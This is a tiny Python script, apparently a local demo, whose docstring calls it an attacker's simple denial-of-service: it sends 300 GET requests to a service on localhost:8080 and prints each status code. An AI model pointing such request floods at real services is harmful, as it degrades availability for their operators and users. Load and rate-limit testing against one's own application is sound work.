"""
Here an attacker, perform a simple DoS flowding the application with
300 request.
"""

import requests


if __name__ == '__main__':
    for idx in range(300):
        response = requests.get("http://localhost:8080")
        print(f"Request {idx+1}: {response.status_code}")

